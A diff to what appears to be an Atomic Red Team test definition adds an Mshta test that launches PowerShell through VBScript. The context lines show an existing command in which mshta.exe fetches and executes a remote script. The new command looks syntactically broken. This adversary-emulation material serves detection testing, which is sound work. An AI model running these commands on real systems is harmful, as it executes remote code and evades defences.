@@ -18,4 +18,18 @@ atomic_tests:
     elevation_required: false
     command: |
       mshta.exe javascript:a=(GetObject('script:#{file_url}')).Exec();close();
-      
+
+- name: Mshta executes VBScript to execute malicious code
+  description: |
+    Run a local VB script to run local user enumeration code
+  supported_platforms:
+    - windows
+  input_arguments:
+    atomics_path:
+      description: path to atomics folder
+      type: path
+      default: C:\atomics
+  executor:
+    name: command_prompt
+    command: |
+      mshta.exe vbscript:Execute("Wscript.Shell powershell.exe")
